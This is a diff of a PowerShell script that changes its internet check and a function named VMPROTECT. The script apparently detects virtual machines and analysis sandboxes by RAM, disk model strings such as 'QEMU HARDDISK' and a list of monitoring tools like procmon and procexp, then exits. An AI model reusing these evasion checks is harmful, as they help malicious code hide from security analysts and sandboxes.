@@ -19,11 +19,12 @@ function Search-IP {
 
 function InternetCheck {
     try {
-    $result = Test-Connection -ComputerName google.com -Count 1 -ErrorAction Stop
-    Write-Host "[!] Internet connection is active." -ForegroundColor Green
-    } catch {
+        $result = Test-Connection -ComputerName google.com -Count 1 -ErrorAction Stop
+        Write-Host "[!] Internet connection is active." -ForegroundColor Green
+    }
+    catch {
     ([Windows.Forms.MessageBox]::Show('INTERNET CONNECTION CHECK FAILED!', 'Error', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error))
-    Stop-Process $pid -Force
+        Stop-Process $pid -Force
     }
 }
 
@@ -124,10 +125,10 @@ function ram_check {
 
 function VMPROTECT {
     ram_check      
-    if (Get-Service -Name "ikeext" -ErrorAction SilentlyContinue | Where-Object { $_.Status -eq "Running" }) {
-        ShowError "ikeext"
-       Stop-Process $pid -Force
-    }     
+    #if (Get-Service -Name "ikeext" -ErrorAction SilentlyContinue | Where-Object { $_.Status -eq "Running" }) {
+    #    ShowError "ikeext"
+    #    Stop-Process $pid -Force
+    #}     
     #triage detection
     $d = wmic diskdrive get model
     if ($d -like "*DADY HARDDISK*" -or $d -like "*QEMU HARDDISK*") {
@@ -180,7 +181,7 @@ function VMPROTECT {
         "procexp64",
         "procmon",
         "procmon64",
-		"pyw",
+        "pyw",
         "qemu-ga",
         "qga",
         "regmon",
